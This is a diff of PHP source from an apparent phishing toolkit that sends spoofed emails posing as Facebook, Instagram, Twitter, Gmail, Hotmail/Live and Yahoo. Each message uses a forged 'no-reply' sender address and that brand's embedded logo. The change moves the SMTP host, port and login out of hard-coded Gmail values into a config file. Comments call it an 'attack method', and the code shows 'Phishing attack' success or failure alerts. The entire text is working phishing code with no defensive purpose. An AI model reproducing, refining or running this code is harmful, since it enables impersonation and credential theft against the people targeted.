@@ -351,7 +351,8 @@ transform: scale(2);
                   $link =   "no-reply" ."@" .$str_link3 .".com";
                    }
 
-
+   
+   //Get email server informations for connect to mail server
   // Get email account details for login mail and send
   // Using one gmail for this attack method
 
@@ -361,14 +362,22 @@ transform: scale(2);
     if ($handle) 
        { 
         while (!feof($handle)) { 
-        $lines[] = fgets($handle, 4096); 
-        } 
+        $line[] = fgets($handle, 4096); 
+         } 
        fclose($handle); 
-       } 
+        } 
 
-      $username_of_mail = $lines[0];
-      $password_of_mail = $lines[1];
+      $mail_debug  = $line[1];
+      $mail_auth   = $line[2];
+      $mail_secure = $line[3];
+      $mail_host   = $line[4];
+      $mail_port   = $line[5];
+      $mail_user   = $line[9];
+      $mail_pass   = $line[10];
 
+
+//echo $mail_debug ."<br>" .$mail_auth ."<br>" .$mail_secure ."<br>" .$mail_host ."<br>" .$mail_port ."<br>" .$mail_user ."<br>" .$mail_pass;
+//exit;
 
 
  if ($link == 'no-reply@facebook_pc.com')
@@ -379,14 +388,14 @@ transform: scale(2);
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
@@ -429,14 +438,14 @@ else if ($link == 'no-reply@facebook_tablet_mobile.com')
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; //465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $passworde_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
@@ -477,14 +486,14 @@ $mail->AddAddress("$email");
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
@@ -508,12 +517,14 @@ $mail->AddAddress("$email");
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
+          // echo $mail->ErrorInfo; exit;
          }
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
+          // echo $mail->ErrorInfo; exit;
        }
       } // end if site ready instagram
 
@@ -525,14 +536,14 @@ else if ($link == 'no-reply@twitter.com')
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
@@ -573,14 +584,14 @@ else if ($link == 'no-reply@gmail.com')
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
@@ -624,14 +635,14 @@ else if ($link == 'no-reply@https://login.live.com')
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
@@ -672,14 +683,14 @@ else if ($link == 'no-reply@yahoo.com')
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
@@ -720,14 +731,14 @@ else
 $mail = new PHPMailer(); // create a new object
 $mail->CharSet = 'UTF-8';
 $mail->IsSMTP(); // enable SMTP
-$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-$mail->SMTPAuth = true; // authentication enabled
-$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-$mail->Host = "smtp.gmail.com";
-$mail->Port = 465; // or 587
+$mail->SMTPDebug = $mail_debug; // debugging: 1 = errors and messages, 2 = messages only
+$mail->SMTPAuth = $mail_auth; // authentication enabled
+$mail->SMTPSecure = "$mail_secure"; // secure transfer enabled REQUIRED for Gmail
+$mail->Host = "$mail_host";
+$mail->Port = $mail_port; // 465 or 587
 $mail->IsHTML(true);
-$mail->Username = $username_of_mail;
-$mail->Password = $password_of_mail;
+$mail->Username = $mail_user;
+$mail->Password = $mail_pass;
 $mail->SetFrom($link, $link);
 $mail->FromName = $link;
 $mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
